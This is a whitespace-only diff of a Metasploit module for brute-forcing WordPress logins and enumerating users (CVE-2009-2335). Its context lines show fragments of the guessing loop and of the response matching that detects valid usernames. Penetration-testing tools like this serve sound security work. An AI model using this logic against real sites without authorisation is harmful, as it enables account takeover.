@@ -23,16 +23,16 @@ class Metasploit3 < Msf::Auxiliary
 			'Name'           => 'Wordpress Brute Force and User Enumeration Utility',
 			'Version'        => '$Revision$',
 			'Description'    => 'Wordpress Authentication Brute Force and User Enumeration Utility',
-			'Author'         => [   
+			'Author'         => [
 				'==[ Alligator Security Team ]==',
 				'Tiago Ferreira <tiago.ccna[at]gmail.com>'
-		],  
-			'References'     => 
+		],
+			'References'     =>
 				[
 					['BID', '35581'],
 					['CVE', 'CVE-2009-2335'],
 					['OSVDB', '55713'],
-				],  
+				],
 			'License'        =>  MSF_LICENSE
 		)
 
@@ -52,7 +52,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	def run_host(ip)
 		if datastore['VALIDATE_USERS']
-			@users_found = {}		
+			@users_found = {}
 			vprint_status("#{target_url} - WordPress Enumeration - Running User Enumeration")
 			each_user_pass { |user, pass|
 				do_enum(user)
@@ -73,12 +73,12 @@ class Metasploit3 < Msf::Auxiliary
 					return
 				end
 			end
-			each_user_pass { |user, pass|					
+			each_user_pass { |user, pass|
 				if datastore['VALIDATE_USERS']
 					next unless @users_found[user]
 				end
 					do_login(user, pass)
-			}		
+			}
 		end
 	end
 
@@ -101,7 +101,7 @@ class Metasploit3 < Msf::Auxiliary
 				if (res.body.to_s =~ /Incorrect password/ )
 					valid_user = true
 
-				elsif (res.body.to_s =~ /document\.getElementById\(\'user_pass\'\)/ )		
+				elsif (res.body.to_s =~ /document\.getElementById\(\'user_pass\'\)/ )
 					valid_user = true
 
 				else
